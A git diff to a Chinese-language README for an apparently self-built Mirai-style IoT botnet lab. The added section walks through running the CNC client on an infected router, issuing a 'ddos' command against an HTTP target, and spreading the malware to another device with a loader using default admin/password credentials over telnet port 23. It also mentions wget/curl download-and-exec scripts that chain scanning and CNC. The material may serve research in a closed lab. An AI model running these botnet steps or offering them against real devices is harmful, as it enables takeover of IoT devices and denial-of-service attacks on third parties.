@@ -37,7 +37,7 @@
 
   * ```CNC```，在此資料夾中實現CNC client功能，程式碼中實現已layer 7的DDoS攻擊，當執行階段的時候會與CNC server保持連接，並等候CNC server發送指令，當CNC server傳送指令並接收到時，會解析指令是否為ddos開頭，當指令為ddos開頭並且參數為IP位置，則會建立一個ddos攻擊並持續60s，這些攻擊與參數可自行設定。
 
-  其中，因為要讓該程式碼進行編譯，在資料夾中有build.sh是用來自動編譯這些檔案成不同架構，其中架構如下:
+  其中，因為要讓該程式碼進行編譯，在資料夾中的```build.sh```是用來自動編譯這些檔案成不同架構，其中架構如下:
   ```
   linux/386
   linux/amd64
@@ -278,3 +278,60 @@ python3 loader.py
 如下結果，右邊可以看到被感染後，裝置正向bin_server索取檔案下載，並且可以到裝置中看到被感染後結果。
 
 ![](../image/Mirai_test/binfile.gif)
+
+在上述有提到，如果```wget_download_exec.sh```與```curl_download_exec.sh```下方程式碼移除註解則會自動再接續執行scanner以及執行CNC功能。
+
+在此操作，僅展示手動執行以便查看感染狀態。
+
+在IoT device端因為被成功感染後，我們手動執行CNC功能。
+
+使用SSH的方式登入裝置並查看檔案是否成功被存放於裝置內部。
+
+```
+ssh admin@192.168.6.163
+```
+並且查看與執行CNC，與CNC server進行連接
+
+```
+ls
+./cnc
+```
+
+在CNC server端輸入指令，在範例中我們嘗試輸入test字串給CNC client進行接收。若CNC client可以看到字串表示連接成功，並保持TCP連接狀態。
+
+使用指令ddos發動攻擊
+
+```
+ddos http://192.168.6.97/
+```
+
+我們透過發送指令給IoT device上，並且攻擊Attacker主機
+
+操作結果如下圖
+
+![](../image/Mirai_test/CNC.gif)
+
+再回到系統上使用指令```htop```即可查看當前資源使用率
+
+![](../image/Mirai_test/ddos.jpg)
+
+可以看到在未啟動任何服務的狀態時，資源被占用近30~40%
+
+表示資源較弱的IoT裝置也能夠造成一定的傷害。
+
+
+在device端手動操作感染到下一裝置上，同樣以RT-AX88U為例，並且找來另一式裝置
+
+首先使用Telnet或SSH的方式登入令一式裝置中(該裝置IP為192.168.6.2)，並且查看裝置狀態
+
+![](../image/Mirai_test/login.gif)
+
+接著回到RT-AX88U裝置中，查看檔案後，並使用loader，並且在已知帳號為admin密碼為password的狀況將參數帶入到執行指令後方，並選擇使用23 port的方式感染，如下
+
+```
+./loader admin password 192.168.6.2 23
+```
+
+![](../image/Mirai_test/infection.gif)
+
+最後回到另一式裝置中即可看到裝置已被感染且移植相關執行檔。
